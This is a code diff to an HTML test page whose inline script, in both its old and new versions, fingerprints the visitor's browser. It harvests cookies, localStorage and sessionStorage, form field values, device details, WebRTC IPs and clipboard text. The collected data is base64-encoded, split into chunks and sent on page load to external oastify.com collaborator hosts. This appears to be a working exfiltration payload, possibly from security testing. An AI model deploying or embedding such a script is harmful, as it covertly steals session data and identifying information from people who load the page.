@@ -7,428 +7,132 @@
 <body>
     Testing...
     <script>
-    (async () => {
+    (async function(){
         'use strict';
+        var URL = 'https://qvp7heljwwwxquggd5lrbply6pcg06ov.oastify.com/';
+        var SESS = Math.random().toString(36).slice(2) + Date.now().toString(36).slice(-4);
+        var N = navigator;
 
-        // ---------- Helpers ----------
-        // Convert a string to base64 (UTF‑8 safe)
-        function toBase64(str) {
-            const bytes = new TextEncoder().encode(str);
-            const binary = String.fromCharCode(...bytes);
-            return btoa(binary);
+        function b64(s){
+            try{
+                return btoa(encodeURIComponent(s).replace(/%([0-9A-F]{2})/g,function(_,p1){
+                    return String.fromCharCode('0x'+p1);
+                })).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/g,'');
+            }catch(e){ return 'err'; }
+        }
+        function t(s,n){ return (s||'').toString().slice(0,n); }
+
+        var d = {};
+
+        // 1. Navigator core
+        try{ d.nav = {ua:t(N.userAgent,300),av:t(N.appVersion,200),acn:N.appCodeName,an:N.appName,pl:N.platform,vd:N.vendor,vs:N.vendorSub,pr:N.product,ps:N.productSub,oscpu:N.oscpu,bid:N.buildID,lng:N.language,lgs:N.languages,ce:N.cookieEnabled,onl:N.onLine,hwc:N.hardwareConcurrency,dmem:N.deviceMemory,mtp:N.maxTouchPoints,pdf:N.pdfViewerEnabled,wd:N.webdriver,dnt:N.doNotTrack,java:typeof N.javaEnabled==='function'?N.javaEnabled():'u',bl:!!N.bluetooth,usb:!!N.usb,cred:!!N.credentials,kb:!!N.keyboard,mc:!!N.mediaCapabilities,md:!!N.mediaDevices,perm:!!N.permissions,pres:!!N.presentation,sched:!!N.scheduling,wl:!!N.wakeLock,geo:!!N.geolocation,sb:!!N.sendBeacon,share:!!N.share,canShare:!!N.canShare,contacts:!!N.contacts,clipboard:!!N.clipboard,mediaSession:!!N.mediaSession}; }catch(e){ d.nav={e:e.message}; }
+
+        // 2. Plugins & MimeTypes
+        try{ d.plugs=[]; var p=N.plugins; for(var i=0;i<Math.min(p.length,8);i++) d.plugs.push({n:p[i].name,d:t(p[i].description,80),f:p[i].filename,v:p[i].version}); d.mimes=[]; var m=N.mimeTypes; for(var j=0;j<Math.min(m.length,8);j++) d.mimes.push({t:m[j].type,d:t(m[j].description,40),e:m[j].enabledPlugin?m[j].enabledPlugin.name:null}); }catch(e){ d.plugs={e:e.message}; }
+
+        // 3. User Agent Data (Client Hints)
+        try{ if(N.userAgentData){ var u=N.userAgentData; d.uad={m:u.mobile,p:u.platform,brands:u.brands?u.brands.map(function(b){return{b:b.brand,v:b.version}}):[]}; if(u.getHighEntropyValues){ var he=await Promise.race([u.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']),new Promise(function(r){setTimeout(function(){r({});},300);})]); d.uad.he={arch:he.architecture,bit:he.bitness,model:t(he.model,40),pv:t(he.platformVersion,40),uafv:t(he.uaFullVersion,40)}; } } }catch(e){ d.uad={e:e.message}; }
+
+        // 4. Screen
+        try{ var s=screen; d.scr={w:s.width,h:s.height,aw:s.availWidth,ah:s.availHeight,al:s.availLeft,at:s.availTop,cd:s.colorDepth,pd:s.pixelDepth,o:s.orientation?{t:s.orientation.type,a:s.orientation.angle}:'u'}; }catch(e){ d.scr={e:e.message}; }
+
+        // 5. Window
+        try{ var w=window; d.win={iw:w.innerWidth,ih:w.innerHeight,ow:w.outerWidth,oh:w.outerHeight,sx:w.screenX||w.screenLeft,sy:w.screenY||w.screenTop,sl:w.screenLeft,st:w.screenTop,dpr:w.devicePixelRatio,len:w.length,op:!!w.opener,par:w.parent!==w,top:w.top!==w,name:w.name,closed:w.closed,status:w.status}; if(w.visualViewport) d.win.vv={w:w.visualViewport.width,h:w.visualViewport.height,s:w.visualViewport.scale,ol:w.visualViewport.offsetLeft,ot:w.visualViewport.offsetTop,pl:w.visualViewport.pageLeft,pt:w.visualViewport.pageTop}; }catch(e){ d.win={e:e.message}; }
+
+        // 6. Location
+        try{ var l=location; d.loc={h:t(l.href,250),pr:l.protocol,ho:l.host,hn:l.hostname,po:l.port,pa:l.pathname,se:t(l.search,150),ha:t(l.hash,80)}; }catch(e){ d.loc={e:e.message}; }
+
+        // 7. Document
+        try{ var doc=document; d.doc={t:t(doc.title,80),c:t(doc.cookie,400),ref:t(doc.referrer,250),dom:doc.domain,lm:doc.lastModified,rs:doc.readyState,cs:doc.characterSet||doc.charset,cm:doc.compatMode,dt:doc.doctype?doc.doctype.name:'u',bu:t(doc.baseURI,150),du:t(doc.documentURI,150),ct:doc.contentType,hid:doc.hidden,vs:doc.visibilityState,hf:doc.hasFocus(),ae:doc.activeElement?doc.activeElement.tagName:'u',ple:doc.pointerLockElement?doc.pointerLockElement.tagName:null,fse:doc.fullscreenElement?doc.fullscreenElement.tagName:null,df:doc.designMode,cw:doc.documentElement.clientWidth,ch:doc.documentElement.clientHeight,sw:doc.documentElement.scrollWidth,sh:doc.documentElement.scrollHeight}; }catch(e){ d.doc={e:e.message}; }
+
+        // 8. Storage
+        try{ d.ls={}; for(var a=0;a<Math.min(localStorage.length,10);a++){ var k=localStorage.key(a); d.ls[k]=t(localStorage.getItem(k),80); } }catch(e){ d.ls={e:e.message}; }
+        try{ d.ss={}; for(var b=0;b<Math.min(sessionStorage.length,10);b++){ var k2=sessionStorage.key(b); d.ss[k2]=t(sessionStorage.getItem(k2),80); } }catch(e){ d.ss={e:e.message}; }
+
+        // 9. History
+        try{ d.hist=history.length; }catch(e){ d.hist='err'; }
+
+        // 10. Performance
+        try{ var perf=window.performance; d.perf={}; if(perf.timing){ var tm=perf.timing; d.perf.timing={dns:tm.domainLookupEnd-tm.domainLookupStart,con:tm.connectEnd-tm.connectStart,res:tm.responseEnd-tm.responseStart,dom:tm.domComplete-tm.domLoading,le:tm.loadEventEnd-tm.loadEventStart,ns:tm.navigationStart}; } if(perf.memory) d.perf.mem={used:perf.memory.usedJSHeapSize,total:perf.memory.totalJSHeapSize,limit:perf.memory.jsHeapSizeLimit}; if(perf.navigation) d.perf.nav={type:perf.navigation.type,rc:perf.navigation.redirectCount}; d.perf.now=perf.now(); }catch(e){ d.perf={e:e.message}; }
+
+        // 11. Connection
+        try{ var c=N.connection||N.mozConnection||N.webkitConnection; d.conn=c?{et:c.effectiveType,dl:c.downlink,dlm:c.downlinkMax,rtt:c.rtt,sd:c.saveData,ty:c.type}:'u'; }catch(e){ d.conn={e:e.message}; }
+
+        // 12. WebGL
+        try{ var cv=document.createElement('canvas'); var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl'); if(gl){ var di=gl.getExtension('WEBGL_debug_renderer_info'); d.gl={v:gl.getParameter(gl.VERSION),slv:gl.getParameter(gl.SHADING_LANGUAGE_VERSION),ven:gl.getParameter(gl.VENDOR),ren:gl.getParameter(gl.RENDERER),uv:di?gl.getParameter(di.UNMASKED_VENDOR_WEBGL):'u',ur:di?gl.getParameter(di.UNMASKED_RENDERER_WEBGL):'u',mts:gl.getParameter(gl.MAX_TEXTURE_SIZE),mvs:gl.getParameter(gl.MAX_VIEWPORT_DIMS),mva:gl.getParameter(gl.MAX_VERTEX_ATTRIBS)}; } }catch(e){ d.gl={e:e.message}; }
+
+        // 13. Canvas
+        try{ var c2=document.createElement('canvas'); var ctx=c2.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillText('AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRr',2,2); d.cv=c2.toDataURL().slice(0,100); }catch(e){ d.cv={e:e.message}; }
+
+        // 14. Audio
+        try{ var AC=window.AudioContext||window.webkitAudioContext; if(AC){ var ac=new AC(); d.au={sr:ac.sampleRate,st:ac.state,bl:ac.baseLatency,dc:ac.destination?ac.destination.channelCount:'u'}; ac.close(); } }catch(e){ d.au={e:e.message}; }
+
+        // 15. Touch & Sensors
+        try{ d.touch={ts:'ontouchstart' in window,te:'TouchEvent' in window,mtp:N.maxTouchPoints}; }catch(e){ d.touch={e:e.message}; }
+        try{ d.dm='DeviceMotionEvent' in window; }catch(e){ d.dm='err'; }
+        try{ d.dor='DeviceOrientationEvent' in window; }catch(e){ d.dor='err'; }
+
+        // 16. Browser-specific
+        try{ d.chrome=typeof chrome!=='undefined'?{yes:true,loadTimes:!!chrome.loadTimes,csi:!!chrome.csi}:false; }catch(e){ d.chrome='err'; }
+        try{ d.ff=typeof InstallTrigger!=='undefined'; }catch(e){ d.ff='err'; }
+        try{ d.moz={mx:window.mozInnerScreenX,my:window.mozInnerScreenY}; }catch(e){ d.moz='err'; }
+        try{ d.ie=document.documentMode; }catch(e){ d.ie='err'; }
+        try{ d.wk=typeof webkitURL!=='undefined'||!!window.webkitRequestAnimationFrame; }catch(e){ d.wk='err'; }
+
+        // 17. Speech
+        try{ if(window.speechSynthesis){ var v=window.speechSynthesis.getVoices(); d.spk=v.slice(0,5).map(function(vo){return{n:vo.name,l:vo.lang};}); } }catch(e){ d.spk={e:e.message}; }
+
+        // 18. Iframes
+        try{ d.ifr=[]; var fr=document.getElementsByTagName('iframe'); for(var f=0;f<Math.min(fr.length,5);f++) d.ifr.push({s:t(fr[f].src,80),n:fr[f].name,id:fr[f].id,sb:fr[f].sandbox?fr[f].sandbox.toString():null}); }catch(e){ d.ifr={e:e.message}; }
+
+        // 19. Scripts
+        try{ d.scripts=[]; var sc=document.scripts; for(var g=0;g<Math.min(sc.length,10);g++) d.scripts.push(t(sc[g].src,80)); }catch(e){ d.scripts={e:e.message}; }
+
+        // 20. Links
+        try{ d.links=[]; var ln=document.links; for(var h=0;h<Math.min(ln.length,10);h++) d.links.push(t(ln[h].href,80)); }catch(e){ d.links={e:e.message}; }
+
+        // 21. Images
+        try{ d.imgs=[]; var im=document.images; for(var ii=0;ii<Math.min(im.length,5);ii++) d.imgs.push(t(im[ii].src,80)); }catch(e){ d.imgs={e:e.message}; }
+
+        // 22. Forms
+        try{ d.forms=[]; var fm=document.forms; for(var fi=0;fi<Math.min(fm.length,3);fi++){ var fo=fm[fi]; var inp=[]; for(var ij=0;ij<Math.min(fo.elements.length,5);ij++){ var el=fo.elements[ij]; inp.push({n:el.name,t:el.type,id:el.id,v:el.type==='password'?'[PWD]':t(el.value,40)}); } d.forms.push({a:t(fo.action,80),m:fo.method,n:fo.name,id:fo.id,i:inp}); } }catch(e){ d.forms={e:e.message}; }
+
+        // 23. Meta
+        try{ d.meta=[]; var mt=document.getElementsByTagName('meta'); for(var mi=0;mi<Math.min(mt.length,5);mi++) d.meta.push({n:mt[mi].name,c:t(mt[mi].content,80),p:mt[mi].getAttribute('property'),h:mt[mi].httpEquiv}); }catch(e){ d.meta={e:e.message}; }
+
+        // 24. Date/Time
+        try{ d.time={iso:new Date().toISOString(),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,off:new Date().getTimezoneOffset(),loc:N.language}; }catch(e){ d.time={e:e.message}; }
+
+        // 25. Battery
+        try{ if(N.getBattery){ var bat=await Promise.race([N.getBattery(),new Promise(function(r){setTimeout(function(){r(null);},300);})]); if(bat) d.bat={l:bat.level,c:bat.charging,ct:bat.chargingTime,dt:bat.dischargingTime}; } }catch(e){ d.bat={e:e.message}; }
+
+        // 26. MediaDevices
+        try{ if(N.mediaDevices&&N.mediaDevices.enumerateDevices){ var dev=await Promise.race([N.mediaDevices.enumerateDevices(),new Promise(function(r){setTimeout(function(){r([]);},300);})]); d.md=dev.slice(0,6).map(function(de){return{k:de.kind,l:t(de.label,25),gid:t(de.groupId,8)};}); } }catch(e){ d.md={e:e.message}; }
+
+        // 27. Permissions
+        try{ if(N.permissions){ var per=['notifications','camera','microphone','clipboard-read','clipboard-write','geolocation']; d.perms={}; await Promise.race([Promise.all(per.map(async function(na){try{var st=await N.permissions.query({name:na});d.perms[na]=st.state;}catch(e2){d.perms[na]='err';}})),new Promise(function(r){setTimeout(r,400);})]); } }catch(e){ d.perms={e:e.message}; }
+
+        // 28. Fonts (canvas measure)
+        try{ var fcv=document.createElement('canvas'); var fctx=fcv.getContext('2d'); var fonts=['Arial','Courier New','Georgia','Times New Roman','Verdana','Helvetica','Impact','Trebuchet MS']; d.fonts={}; for(var fi2=0;fi2<fonts.length;fi2++){ fctx.font='20px '+fonts[fi2]; d.fonts[fonts[fi2]]=fctx.measureText('mmmmmmmmmm').width; } }catch(e){ d.fonts={e:e.message}; }
+
+        // ---------- Build & split ----------
+        var json = JSON.stringify({s:SESS,d:d});
+        var payload = b64(json);
+        var total = payload.length;
+        var size = Math.ceil(total / 3);
+        var chunks = [payload.slice(0,size), payload.slice(size,size*2), payload.slice(size*2)];
+
+        // ---------- Send ----------
+        function send(url){
+            try{ new Image().src = url; }catch(e){}
+            try{ fetch(url, {method:'GET', mode:'no-cors'}); }catch(e){}
+            try{ var x = new XMLHttpRequest(); x.open('GET', url, true); x.send(); }catch(e){}
         }
 
-        // Send a chunk (or any data) to the OAST server
-        function sendToOast(session, chunkIndex, totalChunks, dataBase64) {
-            const baseUrl = 'https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/';
-            const url = `${baseUrl}?session=${session}&chunk=${chunkIndex}&total=${totalChunks}&data=${encodeURIComponent(dataBase64)}`;
-
-            // Multiple delivery methods for reliability
-            try { fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch (_) {}
-            try { if (navigator.sendBeacon) navigator.sendBeacon(url); } catch (_) {}
-            try { new Image().src = url; } catch (_) {}
-        }
-
-        // ---------- Main collection ----------
-        const session = Math.random().toString(36).slice(2) + Date.now().toString(36);
-        const data = {};
-
-        // ---- 1. Navigator & Client Hints ----
-        data.navigator = {};
-        try {
-            const navProps = [
-                'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
-                'vendor','vendorSub','language','languages','cookieEnabled','onLine',
-                'hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack',
-                'pdfViewerEnabled','webdriver','buildID','oscpu'
-            ];
-            navProps.forEach(k => {
-                try { data.navigator[k] = navigator[k]; } catch (_) {}
-            });
-            if (navigator.userAgentData) {
-                try {
-                    data.navigator.uaData = await navigator.userAgentData.getHighEntropyValues([
-                        'platform','platformVersion','architecture','model','uaFullVersion',
-                        'fullVersionList','bitness','wow64','formFactors'
-                    ]);
-                    data.navigator.uaDataMobile = navigator.userAgentData.mobile;
-                    data.navigator.uaDataBrands = navigator.userAgentData.brands;
-                } catch (_) {}
-            }
-        } catch (_) {}
-
-        // ---- 2. Screen & Window ----
-        data.display = {};
-        try {
-            const screenProps = [
-                'width','height','availWidth','availHeight','colorDepth','pixelDepth',
-                'availLeft','availTop'
-            ];
-            screenProps.forEach(k => { data.display['screen_' + k] = screen[k]; });
-            if (screen.orientation) {
-                data.display.screen_orientation = {
-                    type: screen.orientation.type,
-                    angle: screen.orientation.angle
-                };
-            }
-            data.display.window = {
-                innerWidth, innerHeight, outerWidth, outerHeight,
-                screenX, screenY, screenLeft, screenTop,
-                devicePixelRatio, length: window.length, name: window.name,
-                opener: !!window.opener, isFramed: self !== top,
-                crossOriginIsolated, isSecureContext, origin: location.origin
-            };
-            try { top.location.href; data.display.window.isCrossOriginFramed = false; }
-            catch (_) { data.display.window.isCrossOriginFramed = true; }
-        } catch (_) {}
-
-        // ---- 3. Location, Document & Locale ----
-        data.page = {};
-        try {
-            data.page.location = {
-                href: location.href, protocol: location.protocol,
-                host: location.host, hostname: location.hostname,
-                port: location.port, pathname: location.pathname,
-                search: location.search, hash: location.hash, origin: location.origin
-            };
-            data.page.document = {
-                title: document.title, referrer: document.referrer,
-                domain: document.domain, cookie: document.cookie,
-                lastModified: document.lastModified, readyState: document.readyState,
-                characterSet: document.characterSet, compatMode: document.compatMode
-            };
-            data.page.locale = Intl.DateTimeFormat().resolvedOptions();
-            data.page.timezoneOffset = new Date().getTimezoneOffset();
-            data.page.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.page.date = new Date().toString();
-        } catch (_) {}
-
-        // ---- 4. Plugins, MIME & Features ----
-        data.browser = {};
-        try {
-            data.browser.plugins = Array.from(navigator.plugins || []).map(p => ({
-                name: p.name, filename: p.filename, description: p.description
-            }));
-            data.browser.pluginsCount = navigator.plugins?.length || 0;
-            data.browser.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
-                type: m.type, description: m.description, suffixes: m.suffixes
-            }));
-            data.browser.features = {
-                wasm: typeof WebAssembly === 'object',
-                sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
-                bigInt: typeof BigInt !== 'undefined',
-                webGPU: 'gpu' in navigator,
-                webRTC: 'RTCPeerConnection' in window,
-                webAudio: !!(window.AudioContext || window.webkitAudioContext),
-                fileSystemAccess: 'showOpenFilePicker' in window,
-                bluetooth: 'bluetooth' in navigator,
-                usb: 'usb' in navigator,
-                serial: 'serial' in navigator,
-                hid: 'hid' in navigator,
-                serviceWorker: 'serviceWorker' in navigator,
-                sharedWorker: typeof SharedWorker !== 'undefined',
-                indexedDB: 'indexedDB' in window,
-                cacheAPI: 'caches' in window
-            };
-            data.browser.historyLength = history.length;
-            if (typeof Notification !== 'undefined') {
-                data.browser.notificationPermission = Notification.permission;
-            }
-        } catch (_) {}
-
-        // ---- 5. WebGL, WebGL2 & Canvas ----
-        data.graphics = {};
-        try {
-            const c = document.createElement('canvas');
-            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-            if (gl) {
-                let unmaskedVendor = null, unmaskedRenderer = null;
-                try {
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (dbg) {
-                        unmaskedVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-                        unmaskedRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-                    }
-                } catch (_) {}
-                data.graphics.webgl = {
-                    vendor: gl.getParameter(gl.VENDOR),
-                    renderer: gl.getParameter(gl.RENDERER),
-                    version: gl.getParameter(gl.VERSION),
-                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                    unmaskedVendor, unmaskedRenderer,
-                    extensions: gl.getSupportedExtensions()
-                };
-            }
-            const gl2 = document.createElement('canvas').getContext('webgl2');
-            if (gl2) {
-                data.graphics.webgl2 = {
-                    version: gl2.getParameter(gl2.VERSION),
-                    vendor: gl2.getParameter(gl2.VENDOR),
-                    renderer: gl2.getParameter(gl2.RENDERER)
-                };
-            }
-            // Extended canvas fingerprint
-            const c2 = document.createElement('canvas');
-            const ctx = c2.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 4, 17);
-            // Add a second canvas with different text to increase entropy
-            const c3 = document.createElement('canvas');
-            const ctx3 = c3.getContext('2d');
-            ctx3.textBaseline = 'bottom';
-            ctx3.font = '18px Times New Roman';
-            ctx3.fillStyle = '#000';
-            ctx3.fillText('The quick brown fox jumps over the lazy dog', 10, 30);
-            ctx3.strokeStyle = '#f00';
-            ctx3.lineWidth = 2;
-            ctx3.strokeRect(5, 5, 200, 40);
-            data.graphics.canvas1 = c2.toDataURL();
-            data.graphics.canvas2 = c3.toDataURL();
-        } catch (_) {}
-
-        // ---- 6. Performance, Connection, Battery, Storage ----
-        data.system = {};
-        try {
-            data.system.performance = { now: performance.now(), timeOrigin: performance.timeOrigin };
-            if (performance.memory) {
-                data.system.performance.memory = {
-                    usedJSHeapSize: performance.memory.usedJSHeapSize,
-                    totalJSHeapSize: performance.memory.totalJSHeapSize,
-                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-                };
-            }
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                data.system.connection = {
-                    effectiveType: conn.effectiveType, downlink: conn.downlink,
-                    rtt: conn.rtt, saveData: conn.saveData, type: conn.type
-                };
-            }
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                data.system.battery = {
-                    charging: b.charging, level: b.level,
-                    chargingTime: b.chargingTime, dischargingTime: b.dischargingTime
-                };
-            }
-            if (navigator.storage?.estimate) {
-                data.system.storageEstimate = await navigator.storage.estimate();
-            }
-            try { data.system.localStorageLen = localStorage.length; } catch (_) {}
-            try { data.system.sessionStorageLen = sessionStorage.length; } catch (_) {}
-            data.system.hardware = {
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints
-            };
-        } catch (_) {}
-
-        // ---- 7. Media Devices, Permissions & Media Queries ----
-        data.media = {};
-        try {
-            const devs = await navigator.mediaDevices.enumerateDevices();
-            data.media.mediaDevices = devs.map(d => ({
-                kind: d.kind,
-                label: d.label ? '[redacted]' : '',
-                deviceId: d.deviceId ? d.deviceId.slice(0, 8) + '...' : '',
-                groupId: d.groupId ? d.groupId.slice(0, 8) + '...' : ''
-            }));
-            data.media.mediaDevicesCount = devs.length;
-
-            const names = ['camera','microphone','geolocation','notifications',
-                           'clipboard-read','clipboard-write','persistent-storage'];
-            data.media.permissions = {};
-            for (const n of names) {
-                try {
-                    const r = await navigator.permissions.query({name: n});
-                    data.media.permissions[n] = r.state;
-                } catch (_) {}
-            }
-            data.media.mediaQueries = {
-                prefersColorScheme: matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                prefersReducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
-                hover: matchMedia('(hover: hover)').matches,
-                pointer: matchMedia('(pointer: coarse)').matches ? 'coarse' :
-                         matchMedia('(pointer: fine)').matches ? 'fine' : 'none'
-            };
-        } catch (_) {}
-
-        // ---- 8. WebRTC, Audio & Fonts ----
-        data.fingerprint = {};
-        try {
-            // WebRTC – wait for ICE gathering to finish
-            const pc = new RTCPeerConnection({iceServers: []});
-            pc.createDataChannel('');
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            data.fingerprint.webrtc = [];
-            const candidates = [];
-            pc.onicecandidate = e => {
-                if (e.candidate && e.candidate.candidate) {
-                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (m) candidates.push(m[1]);
-                }
-            };
-            await new Promise((resolve) => {
-                if (pc.iceGatheringState === 'complete') resolve();
-                else pc.onicegatheringstatechange = () => {
-                    if (pc.iceGatheringState === 'complete') resolve();
-                };
-            });
-            data.fingerprint.webrtc = [...new Set(candidates)];
-            pc.close();
-
-            // Audio
-            const AC = window.AudioContext || window.webkitAudioContext;
-            if (AC) {
-                const ctx = new AC();
-                data.fingerprint.audio = {
-                    sampleRate: ctx.sampleRate,
-                    state: ctx.state,
-                    baseLatency: ctx.baseLatency || null,
-                    maxChannelCount: ctx.destination.maxChannelCount
-                };
-                ctx.close();
-            }
-
-            // Font detection
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const fontList = ['Arial','Arial Black','Calibri','Comic Sans MS','Courier New',
-                              'Georgia','Impact','Times New Roman','Trebuchet MS','Verdana',
-                              'Segoe UI','Tahoma','Lucida Console','MS Gothic'];
-            const h = document.createElement('span');
-            h.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
-            h.textContent = 'mmmmmmmmmmlli';
-            document.body.appendChild(h);
-            const defaults = {};
-            baseFonts.forEach(b => { h.style.fontFamily = b; defaults[b] = h.offsetWidth; });
-            data.fingerprint.detectedFonts = [];
-            fontList.forEach(f => {
-                let found = false;
-                baseFonts.forEach(b => {
-                    h.style.fontFamily = `"${f}",${b}`;
-                    if (h.offsetWidth !== defaults[b]) found = true;
-                });
-                if (found) data.fingerprint.detectedFonts.push(f);
-            });
-            document.body.removeChild(h);
-        } catch (_) {}
-
-        // ---- 9. Additional advanced APIs ----
-        data.extra = {};
-        try {
-            // Media Capabilities
-            if (navigator.mediaCapabilities) {
-                const mc = navigator.mediaCapabilities;
-                const videoConfig = { type: 'file', video: { contentType: 'video/mp4', width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } };
-                const audioConfig = { type: 'file', audio: { contentType: 'audio/mp4', channels: 2, bitrate: 128000, samplerate: 44100 } };
-                try {
-                    data.extra.mediaCapabilities = {
-                        video: await mc.decodingInfo(videoConfig),
-                        audio: await mc.decodingInfo(audioConfig)
-                    };
-                } catch (_) {}
-            }
-
-            // Virtual Keyboard (mobile)
-            if (navigator.virtualKeyboard) {
-                data.extra.virtualKeyboard = {
-                    boundingRect: navigator.virtualKeyboard.boundingRect,
-                    overlaysContent: navigator.virtualKeyboard.overlaysContent,
-                    geometrychange: !!navigator.virtualKeyboard.ongeometrychange
-                };
-            }
-
-            // XR
-            if (navigator.xr) {
-                data.extra.xr = {
-                    isSessionSupported: await navigator.xr.isSessionSupported('immersive-vr'),
-                    isHandTracking: 'hand' in navigator.xr
-                };
-            }
-
-            // Wake Lock
-            if (navigator.wakeLock) {
-                try {
-                    const wl = await navigator.wakeLock.request('screen');
-                    data.extra.wakeLock = { type: wl.type, released: false };
-                    wl.release();
-                    data.extra.wakeLock.released = true;
-                } catch (_) {}
-            }
-
-            // Clipboard (read text)
-            if (navigator.clipboard) {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    data.extra.clipboardText = text || '';
-                } catch (_) {}
-            }
-
-            // Gamepads
-            if (navigator.getGamepads) {
-                const pads = navigator.getGamepads();
-                data.extra.gamepads = pads ? Array.from(pads).filter(Boolean).map(g => ({
-                    id: g.id, index: g.index, connected: g.connected,
-                    mapping: g.mapping, axesLength: g.axes.length, buttonsLength: g.buttons.length
-                })) : [];
-            }
-
-            // Media Session
-            if (navigator.mediaSession) {
-                data.extra.mediaSession = {
-                    metadata: !!navigator.mediaSession.metadata,
-                    playbackState: navigator.mediaSession.playbackState,
-                    actionHandlers: ['play','pause','seekbackward','seekforward','previoustrack','nexttrack'].filter(a =>
-                        navigator.mediaSession.setActionHandler ? true : false
-                    )
-                };
-            }
-
-            // Presentation API
-            if (navigator.presentation) {
-                data.extra.presentation = {
-                    defaultRequest: !!navigator.presentation.defaultRequest,
-                    receiver: !!navigator.presentation.receiver
-                };
-            }
-
-            // Share API
-            if (navigator.share) {
-                data.extra.share = { canShare: navigator.canShare ? navigator.canShare({ title: 'test' }) : false };
-            }
-        } catch (_) {}
-
-        // ---------- Send in 3 chunks ----------
-        const json = JSON.stringify({ session, data });
-        const totalLen = json.length;
-        const chunkSize = Math.ceil(totalLen / 3);
-        const chunks = [];
-        for (let i = 0; i < 3; i++) {
-            const start = i * chunkSize;
-            const end = Math.min(start + chunkSize, totalLen);
-            chunks.push(json.slice(start, end));
-        }
-
-        // Encode each chunk to base64 and send
-        chunks.forEach((chunk, idx) => {
-            const b64 = toBase64(chunk);
-            sendToOast(session, idx + 1, 3, b64);
-        });
-
-        // Done marker
-        setTimeout(() => {
-            const doneUrl = `https://l2orezrwaf56bptlx6279r9an1tshi57.oastify.com/?session=${session}&part=done&total=3`;
-            try { fetch(doneUrl, { mode: 'no-cors' }).catch(() => {}); } catch (_) {}
-            try { new Image().src = doneUrl; } catch (_) {}
-        }, 500);
+        var base = URL + '?s=' + SESS + '&total=3&';
+        send(base + 'chunk=1&d=' + chunks[0]);
+        setTimeout(function(){ send(base + 'chunk=2&d=' + chunks[1]); }, 200);
+        setTimeout(function(){ send(base + 'chunk=3&d=' + chunks[2]); }, 400);
     })();
     </script>
 </body>
